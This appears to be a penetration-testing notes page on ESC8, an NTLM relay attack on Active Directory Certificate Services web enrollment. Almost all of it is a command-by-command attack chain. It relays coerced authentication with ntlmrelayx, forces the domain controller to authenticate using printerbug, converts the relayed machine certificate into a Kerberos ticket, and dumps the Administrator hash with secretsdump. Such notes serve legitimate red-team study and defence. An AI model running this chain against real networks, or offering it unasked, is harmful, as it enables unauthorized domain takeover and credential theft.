# ESC8

{% hint style="info" %}
NTLM relay attack targeting an ADCS HTTP endpoint. ADCS supports multiple enrollment methods, `including web enrollment`, which by default occurs over HTTP. A certificate authority configured to allow web enrollment typically hosts the following application at `/CertSrv`
{% endhint %}

#### Tools

* [certipy](https://github.com/ly4k/Certipy)
* [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)

#### Exploit Steps

* `sudo impacket-ntlmrelayx -t http://<CA-IP>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication`  <sup><sub>(listen for inbound connections & relay them to web enrollment service)<sub></sup>
* Wait or Force machine accounts to authenticate against arbitrary hosts is by exploiting the [printer bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)
  * `python3 printerbug.py domain/username:"password"@<DC-IP> <Attacker-IP>`&#x20;
* `pip3 install -I git+https://github.com/wbond/oscrypto.git` <sup><sub>(libcrypto error)<sub></sup>
* `python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01$.pfx -dc-ip <IP> 'domain/DC-Machine Account' /tmp/dc.ccache`&#x20;
* `sudo apt-get install krb5-user -y`
* `sudo nano /etc/krb5.conf`
  *   `[libdefaults]`      \
      `default_realm = <domain>`

      `[realms]`      \
      `domain = {`      \
      `kdc = <DC-FQDN>`      \
      `}`&#x20;
* Update `/etc/hosts` file for DC or other server FQDN resolutions
* `export KRB5CCNAME=/tmp/dc.ccache`
*  `impacket-secretsdump -k -no-pass -dc-ip <IP> -just-dc-user Administrator 'domain/DC-Machine Account'@DC-FQDN`
